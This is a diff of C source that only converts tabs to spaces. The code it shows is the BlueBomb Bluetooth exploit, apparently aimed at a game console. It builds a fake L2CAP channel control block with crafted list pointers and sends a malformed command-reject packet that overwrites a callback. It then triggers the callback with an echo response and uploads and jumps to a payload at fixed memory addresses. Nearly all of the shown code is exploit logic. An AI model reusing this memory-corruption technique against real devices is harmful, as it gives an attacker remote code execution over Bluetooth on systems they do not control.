@@ -21,17 +21,17 @@ struct ccb {
 };
 
 struct l2cap_payload {
-	uint8_t opcode;
-	uint8_t id;
-	uint16_t length;
-	uint8_t data[];
+    uint8_t opcode;
+    uint8_t id;
+    uint16_t length;
+    uint8_t data[];
 } __attribute__ ((packed));
 #define L2CAP_PAYLOAD_LENGTH 4
 
 struct l2cap_packet {
-	uint16_t length;
-	uint16_t cid;
-	struct l2cap_payload payload;
+    uint16_t length;
+    uint16_t cid;
+    struct l2cap_payload payload;
 } __attribute__ ((packed));
 #define L2CAP_HEADER_LENGTH 4
 #define L2CAP_OVERHEAD 8
@@ -210,8 +210,8 @@ static int sdp_handle_bluebomb_service_search_request(uint16_t remote_mtu)
 {
     printf("Preparing service search response\n");
 
-	uint16_t required_size = 1 + 2 + 2 + 2 + 2 + (0x15 * 4) + 1;
-	uint32_t SDP_CB = L2CB + 0xc00;
+    uint16_t required_size = 1 + 2 + 2 + 2 + 2 + (0x15 * 4) + 1;
+    uint32_t SDP_CB = L2CB + 0xc00;
 
     if (required_size > remote_mtu) {
         printf("required_size %d > remote_mtu %d\n", required_size, remote_mtu);
@@ -221,15 +221,15 @@ static int sdp_handle_bluebomb_service_search_request(uint16_t remote_mtu)
 
     memset(&sdp_response_buffer[0], 0x00, required_size);
 
-	struct ccb fake_ccb;
-	memset(&fake_ccb, 0x00, sizeof(struct ccb));
-	fake_ccb.in_use = 1;
-	fake_ccb.chnl_state = htobe32(0x00000002); // CST_TERM_W4_SEC_COMP
-	fake_ccb.p_next_ccb = htobe32(SDP_CB + 0x68);
-	fake_ccb.p_prev_ccb = htobe32(L2CB + 8 + 0x54 - 8);
-	fake_ccb.p_lcb = htobe32(L2CB + 0x8);
-	fake_ccb.local_cid = htobe16(0x0000);
-	fake_ccb.remote_cid = htobe16(0x0000); // Needs to match the rcid sent in the packet that uses the faked ccb.
+    struct ccb fake_ccb;
+    memset(&fake_ccb, 0x00, sizeof(struct ccb));
+    fake_ccb.in_use = 1;
+    fake_ccb.chnl_state = htobe32(0x00000002); // CST_TERM_W4_SEC_COMP
+    fake_ccb.p_next_ccb = htobe32(SDP_CB + 0x68);
+    fake_ccb.p_prev_ccb = htobe32(L2CB + 8 + 0x54 - 8);
+    fake_ccb.p_lcb = htobe32(L2CB + 0x8);
+    fake_ccb.local_cid = htobe16(0x0000);
+    fake_ccb.remote_cid = htobe16(0x0000); // Needs to match the rcid sent in the packet that uses the faked ccb.
 
     sdp_response_buffer[0] = SDP_ServiceSearchResponse;
     big_endian_store_16(sdp_response_buffer, 1, 0x0001); // Transaction ID (ignored, no need to keep track of)
@@ -300,12 +300,12 @@ static int sdp_handle_bluebomb_service_attribute_request(uint16_t remote_mtu)
 
 static void do_hax(void)
 {
-	// Chain these packets together so things are more deterministic.
-	int bad_packet_len = L2CAP_PAYLOAD_LENGTH + 6;
-	int empty_packet_len = L2CAP_PAYLOAD_LENGTH;
-	int total_length = L2CAP_HEADER_LENGTH + bad_packet_len + empty_packet_len;
+    // Chain these packets together so things are more deterministic.
+    int bad_packet_len = L2CAP_PAYLOAD_LENGTH + 6;
+    int empty_packet_len = L2CAP_PAYLOAD_LENGTH;
+    int total_length = L2CAP_HEADER_LENGTH + bad_packet_len + empty_packet_len;
 
-	printf("Sending hax\n");
+    printf("Sending hax\n");
 
     uint16_t remote_mtu = l2cap_get_remote_mtu_for_local_cid(sdp_server_l2cap_cid);
     if (total_length > remote_mtu) {
@@ -316,34 +316,34 @@ static void do_hax(void)
 
     memset(&sdp_response_buffer[0], 0x00, total_length);
 
-	struct l2cap_packet* hax = (struct l2cap_packet*) &sdp_response_buffer[0];
-	struct l2cap_payload *p = &hax->payload;
+    struct l2cap_packet* hax = (struct l2cap_packet*) &sdp_response_buffer[0];
+    struct l2cap_payload *p = &hax->payload;
 
-	hax->length = htole16(bad_packet_len + empty_packet_len);
-	hax->cid = htole16(0x0001);
-	
-	printf("Overwriting callback in switch case 0x9.\n");
-	
-	p->opcode = 0x01; // L2CAP_CMD_REJECT
-	p->id = 0x00;
-	p->length = htole16(0x0006);
-	uint8_t *d = &p->data[0];
-	
-	little_endian_store_16(d, 0, 0x0002); // L2CAP_CMD_REJ_INVALID_CID
-	little_endian_store_16(d, 2, 0x0000); // rcid (from faked ccb)
-	little_endian_store_16(d, 4, 0x0040 + 0x1f); // lcid
-	
-	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));
-	
-	printf("Trigger switch statement 0x9.\n");
-	
-	p->opcode = 0x09; // L2CAP_CMD_ECHO_RSP which will trigger a callback to our payload
-	p->id = 0x00;
-	p->length = htole16(0x0000);
+    hax->length = htole16(bad_packet_len + empty_packet_len);
+    hax->cid = htole16(0x0001);
+    
+    printf("Overwriting callback in switch case 0x9.\n");
+    
+    p->opcode = 0x01; // L2CAP_CMD_REJECT
+    p->id = 0x00;
+    p->length = htole16(0x0006);
+    uint8_t *d = &p->data[0];
+    
+    little_endian_store_16(d, 0, 0x0002); // L2CAP_CMD_REJ_INVALID_CID
+    little_endian_store_16(d, 2, 0x0000); // rcid (from faked ccb)
+    little_endian_store_16(d, 4, 0x0040 + 0x1f); // lcid
+    
+    p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));
+    
+    printf("Trigger switch statement 0x9.\n");
+    
+    p->opcode = 0x09; // L2CAP_CMD_ECHO_RSP which will trigger a callback to our payload
+    p->id = 0x00;
+    p->length = htole16(0x0000);
 
-	p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));
+    p = (struct l2cap_payload*)((uint8_t*)p + L2CAP_PAYLOAD_LENGTH + le16toh(p->length));
 
-	if (send_acl_packet(con_handle, hax, total_length) != 0) {
+    if (send_acl_packet(con_handle, hax, total_length) != 0) {
         printf("Failed to send acl packet\n");
         bluebomb_reset();
     }
@@ -363,13 +363,13 @@ static void upload_payload(void)
     uint32_t remaining = stage1_bin_len - stage1_sent;
     uint32_t to_send = btstack_min(remaining, payload_mtu);
 
-	int upload_packet_len = L2CAP_PAYLOAD_LENGTH + to_send;
-	int total_length = L2CAP_HEADER_LENGTH + upload_packet_len;
+    int upload_packet_len = L2CAP_PAYLOAD_LENGTH + to_send;
+    int total_length = L2CAP_HEADER_LENGTH + upload_packet_len;
 
     memset(&sdp_response_buffer[0], 0x00, total_length);
 
-	struct l2cap_packet* upload = (struct l2cap_packet*) &sdp_response_buffer[0];
-	struct l2cap_payload *p = &upload->payload;
+    struct l2cap_packet* upload = (struct l2cap_packet*) &sdp_response_buffer[0];
+    struct l2cap_payload *p = &upload->payload;
 
     upload->length = htole16(upload_packet_len);
     upload->cid = htole16(0x0001);
@@ -413,8 +413,8 @@ static void jump_paylaod(void)
 
     memset(&sdp_response_buffer[0], 0x00, total_length);
 
-	struct l2cap_packet* jump = (struct l2cap_packet*) &sdp_response_buffer[0];
-	struct l2cap_payload *p = &jump->payload;
+    struct l2cap_packet* jump = (struct l2cap_packet*) &sdp_response_buffer[0];
+    struct l2cap_payload *p = &jump->payload;
 
     jump->length = htole16(jump_packet_len);
     jump->cid = htole16(0x0001);
@@ -619,17 +619,17 @@ int bluebomb_setup(uint32_t l2cb)
 {
     L2CB = l2cb;
 
-	uint32_t payload_addr = 0x81780000; // 512K before the end of mem 1
+    uint32_t payload_addr = 0x81780000; // 512K before the end of mem 1
 
-	if (L2CB >= 0x81000000) {
-		printf("Detected system menu\n");
-		payload_addr = 0x80004000;
-	}
+    if (L2CB >= 0x81000000) {
+        printf("Detected system menu\n");
+        payload_addr = 0x80004000;
+    }
 
-	printf("App settings:\n");
-	printf("\tL2CB: 0x%08lX\n", L2CB);
-	printf("\tpayload_addr: 0x%08lX\n", payload_addr);
-	
+    printf("App settings:\n");
+    printf("\tL2CB: 0x%08lX\n", L2CB);
+    printf("\tpayload_addr: 0x%08lX\n", payload_addr);
+    
     big_endian_store_32(&stage0_bin[0], 0x8, payload_addr);
 
     // Setup bluetooth
